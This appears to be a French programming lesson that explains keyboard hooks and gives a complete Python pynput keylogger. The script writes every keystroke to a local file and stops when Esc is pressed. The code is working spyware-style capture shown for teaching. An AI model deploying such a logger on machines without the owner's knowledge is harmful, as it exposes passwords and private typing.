# Quête 24 : Interception des Entrées Clavier (Keylogger)

## Objectifs de la quête
- [x] Comprendre le mécanisme des "Hooks" (crochets) système pour intercepter les événements.
- [x] Utiliser la bibliothèque `pynput` pour écouter le clavier.
- [x] Sauvegarder les touches saisies dans un fichier `keylog.txt` local.

---

## 1. Le Concept Technique : Les Hooks

Normalement, quand vous appuyez sur une touche, le signal va du clavier au système d'exploitation, qui l'envoie ensuite à l'application active (ex: Word).

Un **Keylogger** utilise un mécanisme appelé **Hook** (hameçon). Il demande au système d'exploitation : *"S'il te plaît, envoie-moi une copie de chaque événement clavier avant (ou pendant) qu'il soit traité par les autres fenêtres."*

Nous allons utiliser la bibliothèque **`pynput`**, qui abstrait cette complexité pour fonctionner aussi bien sur Linux que sur Windows ou macOS.

### Installation
```bash
pip install pynput
2. Le Script : Enregistreur de Frappes (simple_logger.py)
Ce script écoute le clavier en arrière-plan. Pour qu'il reste éducatif et contrôlable, nous avons ajouté une condition d'arrêt : le script s'arrête proprement si on appuie sur la touche ECHAP (Esc).

Code Source
Python
from pynput import keyboard
import time

# Nom du fichier de log
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Fonction appelée à chaque fois qu'une touche est enfoncée.
    """
    try:
        # Cas 1 : Touche standard (lettres, chiffres)
        # On écrit juste le caractère
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
            
    except AttributeError:
        # Cas 2 : Touches spéciales (Espace, Entrée, Ctrl, etc.)
        # key.char n'existe pas pour ces touches, on gère l'exception
        with open(LOG_FILE, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # On remplace le mot 'Key.space' par un vrai espace
            elif key == keyboard.Key.enter:
                f.write("\n") # Nouvelle ligne
            else:
                # Pour les autres (Ctrl, Alt...), on les met entre crochets pour la lisibilité
                f.write(f" [{str(key)}] ")

def on_release(key):
    """
    Fonction appelée quand une touche est relâchée.
    Sert ici principalement à arrêter le programme.
    """
    if key == keyboard.Key.esc:
        print("\n[!] Touche ECHAP détectée. Arrêt de l'enregistrement.")
        # Retourner False arrête le Listener
        return False

print(f"--- Démarrage du Keylogger ---")
print(f"[*] Les frappes sont enregistrées dans '{LOG_FILE}'")
print("[*] Appuyez sur 'ECHAP' pour arrêter le script proprement.")

# Démarrage de l'écouteur (Listener)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
3. Exécution et Analyse
Lancement :

Bash
python3 simple_logger.py
Test :
Ouvrez un bloc-notes ou tapez simplement dans le vide. Écrivez une phrase, par exemple : Je teste mon script Python.
Appuyez ensuite sur ECHAP.

Vérification :
Ouvrez le fichier keylog.txt créé dans le même dossier.

Contenu attendu :

Plaintext
Je teste mon script [Key.shift]Python.